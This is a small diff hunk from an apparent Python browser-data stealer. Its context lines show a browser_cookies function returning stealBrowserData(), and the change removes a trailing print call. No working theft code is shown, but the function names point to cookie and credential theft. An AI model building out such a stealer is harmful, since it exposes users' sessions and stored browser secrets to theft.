@@ -226,5 +226,3 @@ def browser_cookies():
                 return new_file_path
 
     return stealBrowserData()
-
-print(browser_cookies())
